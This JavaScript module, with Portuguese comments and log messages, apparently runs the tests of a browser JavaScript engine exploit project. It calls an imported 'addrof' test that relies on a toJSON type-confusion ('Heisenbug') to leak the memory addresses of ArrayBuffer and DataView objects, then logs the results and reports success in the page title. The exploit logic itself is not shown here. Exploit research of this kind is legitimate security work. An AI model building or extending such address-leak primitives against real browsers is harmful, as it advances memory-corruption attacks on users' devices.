// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_PayloadAsThis_DirectRead, // ATUALIZADO para v59
    FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR // ATUALIZADO para v59
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_PayloadAsThis_DirectRead";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (PayloadAsThis_DirectRead) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_PayloadAsThis_DirectRead();

    logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    }

    if (result.errorCapturedMain) {
        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-PATDR) ERR: ${result.errorCapturedMain.name}`;
    } else {
        logS3(`  RESULTADO: Completou. Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "good", FNAME_RUNNER);

        let heisenbugConfirmed = false;
        // Verificar se C1 foi modificado (embora não seja o foco principal de addrof aqui)
        const call1Details = result.all_probe_calls_for_analysis.find(d => d.call_number === 1);
        if (call1Details && (call1Details.payload_AB || call1Details.payload_DV)) { // Checa se payloads foram postos em C1
            heisenbugConfirmed = true;
            logS3(`  !!!! C1_DETAILS POPULADO COM PAYLOADS NA CALL #1 !!!!`, "info", FNAME_RUNNER);
        }
        // Verificar se um dos alvos de leak se tornou 'this' e houve tentativa de leitura
        const leakTargetProbeHit = result.all_probe_calls_for_analysis.find(d => (d.this_is_leak_target_AB || d.this_is_leak_target_DV) && d.addrof_read_val !== null);
        if (leakTargetProbeHit) {
             logS3(`  !!!! ALVO DE LEAK (${leakTargetProbeHit.this_type}) SE TORNOU 'this' NA SONDA E ADDROF FOI TENTADO (Call #${leakTargetProbeHit.call_number}) !!!!`, "critical", FNAME_RUNNER);
             heisenbugConfirmed = true;
        }

        if (!heisenbugConfirmed && result.rawStringifyForAnalysis && result.rawStringifyForAnalysis.includes("circular structure")) {
            logS3(`  INDICAÇÃO DE HEISENBUG: Erro de estrutura circular no output bruto.`, "warn", FNAME_RUNNER);
            heisenbugConfirmed = true; // Circularidade também é uma forma de Heisenbug
        }
         if (!heisenbugConfirmed) {
             logS3(`  ALERT: Nenhuma indicação clara de Heisenbug (C1 modificado, alvo como 'this', ou circularidade).`, "error", FNAME_RUNNER);
         }


        let anyAddrofSuccess = (result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success);

        if (result.addrof_A_result) {
            logS3(`    ADDROF A (ArrayBuffer): ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result) {
            logS3(`    ADDROF B (DataView): ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR}: Addr SUCCESS!`;
        } else if (heisenbugConfirmed) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR}: Heisenbug OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR}: No Heisenbug?`;
        }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (PayloadAsThis_DirectRead) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (PayloadAsThis_DirectRead) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
            !document.title.includes("ERR") && !document.title.includes("Heisenbug OK")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR} Concluído`;
        }
    }
}
